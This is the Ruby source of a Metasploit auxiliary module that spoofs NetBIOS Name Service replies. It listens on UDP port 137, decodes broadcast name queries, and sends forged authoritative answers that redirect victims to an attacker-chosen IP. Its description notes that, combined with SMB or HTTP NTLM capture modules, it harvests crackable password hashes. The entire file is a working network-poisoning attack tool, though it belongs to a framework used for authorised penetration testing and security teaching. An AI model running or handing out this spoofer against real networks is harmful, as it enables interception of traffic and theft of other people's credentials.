##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Capture

  attr_accessor :sock, :thread


  def initialize
    super(
      'Name'           => 'NetBIOS Name Service Spoofer',
      'Description'    => %q{
          This module forges NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests
          sent to the local subnet's broadcast address and spoof a response, redirecting the querying
          machine to an IP of the attacker's choosing. Combined with auxiliary/server/capture/smb or
          auxiliary/server/capture/http_ntlm it is a highly effective means of collecting crackable hashes on
          common networks.

          This module must be run as root and will bind to udp/137 on all interfaces.
      },
      'Author'     => [ 'Tim Medin <tim[at]securitywhole.com>' ],
      'License'    => MSF_LICENSE,
      'References' =>
        [
          [ 'URL', 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html' ]
        ],
      'Actions'		=>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service'
    )

    register_options([
      OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", "127.0.0.1"]),
      OptRegexp.new('REGEX', [ true, "Regex applied to the NB Name to determine if spoofed reply is sent", '.*']),
    ])

    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
    self.thread = nil
    self.sock = nil
  end

  def dispatch_request(packet, rhost, src_port)
    rhost = ::IPAddr.new(rhost)
    # `recvfrom` (on Linux at least) will give us an ipv6/ipv4 mapped
    # addr like "::ffff:192.168.0.1" when the interface we're listening
    # on has an IPv6 address. Convert it to just the v4 addr
    if rhost.ipv4_mapped?
      rhost = rhost.native
    end

    # Convert to string
    rhost = rhost.to_s

    spoof = ::IPAddr.new(datastore['SPOOFIP'])

    return if packet.length == 0

    nbnsq_transid      = packet[0..1]
    nbnsq_flags        = packet[2..3]
    nbnsq_questions    = packet[4..5]
    nbnsq_answerrr     = packet[6..7]
    nbnsq_authorityrr  = packet[8..9]
    nbnsq_additionalrr = packet[10..11]
    nbnsq_name         = packet[12..45]
    decoded = ""
    nbnsq_name.slice(1..-2).each_byte do |c|
      decoded << "#{(c - 65).to_s(16)}"
    end
    nbnsq_decodedname = "#{[decoded].pack('H*')}".strip()
    nbnsq_type         = packet[46..47]
    nbnsq_class        = packet[48..49]

    return unless nbnsq_decodedname =~ /#{datastore['REGEX'].source}/i

    print_good("#{rhost.ljust 16} nbns - #{nbnsq_decodedname} matches regex, responding with #{spoof}")

    vprint_status("transid:        #{nbnsq_transid.unpack('H4')}")
    vprint_status("tlags:          #{nbnsq_flags.unpack('B16')}")
    vprint_status("questions:      #{nbnsq_questions.unpack('n')}")
    vprint_status("answerrr:       #{nbnsq_answerrr.unpack('n')}")
    vprint_status("authorityrr:    #{nbnsq_authorityrr.unpack('n')}")
    vprint_status("additionalrr:   #{nbnsq_additionalrr.unpack('n')}")
    vprint_status("name:           #{nbnsq_name} #{nbnsq_name.unpack('H34')}")
    vprint_status("full name:      #{nbnsq_name.slice(1..-2)}")
    vprint_status("decoded:        #{decoded}")
    vprint_status("decoded name:   #{nbnsq_decodedname}")
    vprint_status("type:           #{nbnsq_type.unpack('n')}")
    vprint_status("class:          #{nbnsq_class.unpack('n')}")

    # time to build a response packet - Oh YEAH!
    response = nbnsq_transid +
      "\x85\x00" + # Flags = response + authoratative + recursion desired +
      "\x00\x00" + # Questions = 0
      "\x00\x01" + # Answer RRs = 1
      "\x00\x00" + # Authority RRs = 0
      "\x00\x00" + # Additional RRs = 0
      nbnsq_name + # original query name
      nbnsq_type + # Type = NB ...whatever that means
      nbnsq_class+ # Class = IN
      "\x00\x04\x93\xe0" + # TTL = a long ass time
      "\x00\x06" + # Datalength = 6
      "\x00\x00" + # Flags B-node, unique = whatever that means
      spoof.hton

    pkt = PacketFu::UDPPacket.new
    pkt.ip_saddr = Rex::Socket.source_address(rhost)
    pkt.ip_daddr = rhost
    pkt.ip_ttl = 255
    pkt.udp_sport = 137
    pkt.udp_dport = src_port
    pkt.payload = response
    pkt.recalc

    capture_sendto(pkt, rhost)
  end

  def monitor_socket
    while true
      rds = [self.sock]
      wds = []
      eds = [self.sock]

      r,_,_ = ::IO.select(rds,wds,eds,0.25)
      if (r != nil and r[0] == self.sock)
        packet, host, port = self.sock.recvfrom(65535)
        dispatch_request(packet, host, port)
      end
    end
  end

  def run
    check_pcaprub_loaded()
    ::Socket.do_not_reverse_lookup = true  # Mac OS X workaround

    # Avoid receiving extraneous traffic on our send socket
    open_pcap({'FILTER' => 'ether host f0:f0:f0:f0:f0:f0'})

    self.sock = Rex::Socket.create_udp(
      'LocalHost' => "0.0.0.0",
      'LocalPort' => 137,
      'Context'   => { 'Msf' => framework, 'MsfExploit' => self }
    )
    add_socket(self.sock)
    self.sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)

    self.thread = Rex::ThreadFactory.spawn("NBNSServerMonitor", false) {
      begin
        monitor_socket
      rescue ::Interrupt
        raise $!
      rescue ::Exception
        print_error("Error: #{$!.class} #{$!} #{$!.backtrace}")
      end
    }

    print_status("NBNS Spoofer started. Listening for NBNS requests with REGEX \"#{datastore['REGEX'].source}\" ...")

    self.thread.join
    print_status("NBNS Monitor thread exited...")
  end

  def cleanup
    if self.thread and self.thread.alive?
      self.thread.kill
      self.thread = nil
    end
    close_pcap
  end
end
